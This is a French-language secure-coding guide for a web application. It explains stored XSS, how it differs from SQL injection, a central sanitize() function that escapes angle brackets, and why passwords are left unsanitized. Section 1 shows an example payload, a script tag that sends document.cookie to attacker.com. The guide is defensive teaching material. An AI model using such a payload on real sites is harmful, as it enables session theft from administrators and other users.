# Guide de Sécurisation : Validation et Assainissement des Entrées (Input Sanitization)

Ce document explique les vulnérabilités de sécurité liées aux entrées non fiables des utilisateurs et comment notre base de code s'en protège.

---

## 1. Comprendre la Vulnérabilité : Stored XSS (Cross-Site Scripting Stocké)

### Qu'est-ce que le Stored XSS ?
Le XSS stocké (Stored XSS) se produit lorsqu'une application accepte une entrée utilisateur contenant un script malveillant (HTML ou JavaScript) et la stocke de manière permanente dans la base de données (ou le système de fichiers). Plus tard, lorsque cette donnée est récupérée et affichée dans le navigateur d'un autre utilisateur (par exemple, un administrateur consultant une fiche membre), le navigateur interprète et exécute ce script.

### Exemple de Vecteur d'Attaque
Un utilisateur s'inscrit en utilisant la valeur suivante pour son nom complet (`fullName`) :
```html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```
Si cette chaîne est insérée directement dans la base de données sans assainissement, chaque fois qu'un administrateur ouvrira le tableau de bord ERP pour voir ce membre, son navigateur exécutera le script ci-dessus. L'attaquant pourrait alors voler des sessions d'administration, rediriger le navigateur ou manipuler l'interface utilisateur.

---

## 2. Injection SQL vs. XSS

Il est important de distinguer ces deux types d'attaques car leurs mécanismes de défense diffèrent :

| Type d'Attaque | Cible | Mécanisme de Défense |
| :--- | :--- | :--- |
| **Injection SQL** | Moteur de Base de Données | Requêtes paramétrées (déjà utilisées automatiquement par les API Supabase/PostgreSQL) qui séparent le code SQL des données. |
| **XSS Stocké / Réfracté** | Navigateur de l'Utilisateur Final | Assainissement des entrées (Input Sanitization) et échappement à l'affichage (Output Escaping). |

---

## 3. Stratégie d'Assainissement Implémentée

Nous avons intégré une fonction d'assainissement centralisée nommée `sanitize(str, maxLength)` :

```javascript
function sanitize(str, maxLength = 500) {
  if (!str) return '';
  return String(str)
    .replace(/</g, '&lt;')  // Remplace '<' pour empêcher l'interprétation de balises HTML
    .replace(/>/g, '&gt;')  // Remplace '>' pour empêcher l'interprétation de balises HTML
    .trim()                 // Supprime les espaces inutiles en début et fin
    .slice(0, maxLength);   // Limite la taille pour éviter les attaques de saturation (DDoS)
}
```

### Pourquoi ces étapes ?
1. **Échappement de `<` et `>`** : Convertit les caractères de balisage en entités HTML (`&lt;` et `&gt;`). Ainsi, si `<script>` est envoyé, il est stocké sous la forme `&lt;script&gt;`, ce qui s'affichera à l'écran comme du texte inoffensif sans jamais s'exécuter.
2. **Tronquage (`slice`)** : Limite la longueur maximale autorisée. Cela évite le stockage inutile de blocs massifs de texte qui pourraient saturer la base de données ou ralentir l'application.

---

## 4. Exemption des Identifiants (Mots de Passe)

> [!IMPORTANT]
> **Les mots de passe ne doivent jamais être assainis avec cette fonction.**

### Pourquoi exclure les mots de passe ?
- **Complexité préservée** : Les mots de passe peuvent contenir légitimement des caractères comme `<` ou `>`. Modifier ces caractères altérerait la valeur réelle saisie par l'utilisateur, ce qui changerait le hachage final.
- **Sécurité inhérente** : Les mots de passe ne sont jamais réémis ou affichés dans le navigateur sous forme brute de texte. Ils sont hachés immédiatement côté serveur à l'aide de **bcrypt** avant d'être stockés ou comparés. L'affichage ou l'interprétation XSS des mots de passe n'est donc pas possible.
